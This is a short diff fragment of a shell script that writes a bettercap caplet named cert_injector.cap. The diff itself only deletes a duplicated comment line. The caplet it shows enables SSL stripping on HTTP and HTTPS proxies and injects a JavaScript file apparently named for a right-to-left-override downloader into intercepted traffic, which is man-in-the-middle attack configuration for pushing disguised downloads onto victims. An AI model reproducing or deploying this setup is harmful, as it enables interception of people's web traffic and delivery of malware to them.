@@ -205,7 +205,6 @@ EOF
 # ========================
 cat > "$MITM_DIR/cert_injector.cap" <<EOF
 # --- Inject JS into HTTP and HTTPS traffic ---
-# --- Inject JS into HTTP and HTTPS traffic ---
 set http.proxy.sslstrip true
 set https.proxy.sslstrip true
 set http.proxy.injectjs $MITM_DIR/rtlo_downloader.js
